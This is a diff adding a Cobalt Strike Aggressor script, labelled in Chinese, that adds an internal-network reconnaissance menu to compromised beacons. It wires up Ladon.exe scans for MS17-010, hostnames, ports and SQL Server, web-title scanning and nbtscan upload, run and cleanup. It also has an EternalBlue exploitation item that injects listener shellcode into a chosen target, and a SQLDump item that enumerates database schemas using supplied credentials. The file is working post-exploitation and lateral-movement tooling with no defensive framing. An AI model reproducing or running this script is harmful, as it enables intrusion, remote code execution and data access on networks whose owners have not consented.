@@ -1,0 +1,144 @@
+menu "内网探测" {
+	menu "MS17010"{
+		item "MS17010探测"{
+			blog($1, "-------------------------------------------------------------MS17010探测------------------------------------------------------------");
+			$bid = $1;
+			$dialog = dialog("Ms17-010探测", %(ip => "192.168.10.0/24", bid => $bid), &ms17010_scan);
+			dialog_description($dialog, "探测指定ip或ip段存在MS17010的主机");
+			drow_text($dialog, "ip",  "IP or CIDR:");
+			drow_checkbox($dialog, 'type', 'noping');
+			dbutton_action($dialog, "Go");
+			dialog_show($dialog);
+		}
+		sub ms17010_scan{
+			if($3['type'] eq "true"){
+				bexecute_assembly($bid, script_resource('/exe/Ladon.exe'), 'noping '.$3['ip'].' '.'MS17010');
+			}else{
+				bexecute_assembly($bid, script_resource('/exe/Ladon.exe'), $3['ip'].' '.'MS17010');
+			}	
+		}
+		item "MS17010利用"{
+			blog($1, "-------------------------------------------------------------MS17010利用------------------------------------------------------------");
+			$bid = $1;
+			$dialog = dialog("Ms17-010", %(ip => "192.168.1.1", grooms => "12", max_attempts => "5", bid => $bid, listener => 'listener'), &ms17_010);
+			drow_text($dialog, "ip",  "IP: "); 	
+			drow_listener($dialog, "listener", "Listener: ");
+			drow_text($dialog, "grooms",  "Grooms: ");
+			drow_text($dialog, "max_attempts",  "Attemps: ");
+			dbutton_action($dialog, "Go");
+			dialog_show($dialog);
+		}
+		sub ms17_010 {
+			$listener = $3['listener'];
+			$stager = transform(shellcode($listener, false, "x64"),"array");
+			bpowershell_import($bid, script_resource("/powershell/Invoke-EternalBlue.ps1"));
+		    bpowerpick($bid, 'Invoke-EternalBlue -Target '.$3['ip'].' -Shellcode @('.$stager.') -InitialGrooms '.$3['grooms'].' -MaxAttempts '.$3['max_attempts']);
+		}
+	}
+	item "内网主机名探测"{
+		blog($1, "-------------------------------------------------------------内网主机名探测------------------------------------------------------------");
+		$bid = $1;
+		$dialog = dialog("Ms17-010探测", %(ip => "192.168.10.0/24", bid => $bid), &os_scan);
+		dialog_description($dialog, "探测指定ip或ip段内的主机名以及系统版本");
+		drow_text($dialog, "ip",  "IP or CIDR:");
+		drow_checkbox($dialog, 'type', 'noping');
+		dbutton_action($dialog, "Go");
+		dialog_show($dialog);
+	}
+	sub os_scan{
+		if($3['type'] eq "true"){
+			bexecute_assembly($bid, script_resource('/exe/Ladon.exe'), 'noping '.$3['ip'].' '.'OsScan');
+		}else{
+			bexecute_assembly($bid, script_resource('/exe/Ladon.exe'), $3['ip'].' '.'OsScan');
+		}	
+	}
+	item "端口扫描"{
+		blog($1, "-------------------------------------------------------------端口扫描------------------------------------------------------------");
+		$bid = $1;
+		$dialog = dialog("端口扫描", %(ip => "192.168.10.0/24", bid => $bid), &port_scan);
+		dialog_description($dialog, "探测指定ip或ip段内的主机开放的端口,显示主机名、开放端口、服务识别、Banner、Web标题。如果要探测指定端口，需要将port.txt文件上传到目标机器的当前工作目录。");
+		drow_text($dialog, "ip",  "IP or CIDR:");
+		dbutton_action($dialog, "Go");
+		dialog_show($dialog);
+	}
+	sub port_scan{
+		bexecute_assembly($bid, script_resource('/exe/Ladon.exe'), $3['ip'].' '.'PortScan');
+	}
+	item "枚举SQLServer数据库"{
+		blog($1, "-------------------------------------------------------------端口扫描------------------------------------------------------------");
+		$bid = $1;
+		$dialog = dialog("枚举SQLServer数据库", %(ip => "192.168.10.0/24", bid => $bid), &enummssql);
+		dialog_description($dialog, "枚举SQLServer数据库，显示数据库IP、机器名、SQL版本");
+		drow_text($dialog, "ip",  "IP or CIDR:");
+		dbutton_action($dialog, "Go");
+		dialog_show($dialog);
+	}
+	sub enummssql{
+		bexecute_assembly($bid, script_resource('/exe/Ladon.exe'), $3['ip'].' '.'EnumMssql');
+	}
+	item "内网Web探测" {
+		blog($1, "-------------------------------------------------------------内网Web探测------------------------------------------------------------");
+		$bid = $1['@'];
+		$dialog = dialog("SharpWebScan", %(iptype => "-IP",ip => beacon_info($bid,"internal"),port => "80,8080,8001,1433",bid => $bid), &SharpWebScan);
+		dialog_description($dialog, "多端口web标题扫描");
+		drow_text($dialog, "ip", "ip:  ");	
+		drow_text($dialog, "port", "ports:  ");			
+		drow_combobox($dialog, "iptype", "-ip/-cip", @("-IP", "-CIP"));
+		dbutton_action($dialog, "运行");
+		dialog_show($dialog);
+	}
+	sub SharpWebScan {
+		$arg = join(' ', @($3['iptype'],$3['ip'],$3['port']));
+		bexecute_assembly($bid, script_resource("/exe/SharpWebScan.exe"), $arg);
+	}
+	menu "Nbtscan"{
+		item "上传Nbtscan" {
+			$bid = $1;
+			$dialog = dialog("上传nbtscan", %(UploadPath => "", bid => $bid), &upload_nbtscan);
+            dialog_description($dialog, "上传nbtscan.exe到如下指定目录");
+			drow_text($dialog, "UploadPath",  "上传路径: "); 	
+			dbutton_action($dialog, "上传");
+			dialog_show($dialog);
+		}
+		sub upload_nbtscan {
+			blog($1, "-------------------------------------------------------------上传Nbtscan------------------------------------------------------------");
+		    bcd($bid, $3['UploadPath']);
+		    bupload($bid, script_resource("/exe/nbtscan.exe"));
+		}
+		item "运行Nbtscan" {
+			$bid = $1['@'];
+			$dialog = dialog("运行nbtscan", %(bid => $bid), &run_nbtscan);
+			dialog_description($dialog, "运行nbtscan");
+			drow_text($dialog, "ip", "网段:  ");
+			dbutton_action($dialog, "确定");
+			dialog_show($dialog);
+		}
+		sub run_nbtscan {
+			blog($bid, "-------------------------------------------------------------运行Nbtscan-------------------------------------------------------------");
+			bshell($bid, "nbtscan.exe $3['ip']");
+		}
+		item "删除Nbtscan" {
+			blog($1, "-------------------------------------------------------------删除Nbtscan------------------------------------------------------------");
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "del /f /s /q nbtscan.exe");
+			}
+		}
+	}
+
+	item "SQLDump" {
+		$bid = $1['@'];
+		$dialog = dialog("SharpSQLDump", %(host => "",username => "",password => "",type => "mysql",bid => $bid), &SharpSQLDump);
+		dialog_description($dialog, "内网渗透中快速获取数据库所有库名，表名，列名。具体判断后再去翻数据，节省时间。适用于mysql，mssql。");
+		drow_text($dialog, "host", "host:  ");	
+		drow_text($dialog, "username", "username:  ");	
+		drow_text($dialog, "password", "password:  ");			
+		drow_combobox($dialog, "type", "-mysql/-mssql", @("-mysql", "-mssql"));
+		dbutton_action($dialog, "运行");
+		dialog_show($dialog);
+	}
+	sub SharpSQLDump {
+		$arg = join(' ', @("-h",$3['host'],"-u",$3['username'],"-p",$3['password'],$3['type']));
+		bexecute_assembly($bid, script_resource("/exe/SharpSQLDump.exe"), $arg);
+	}
+}
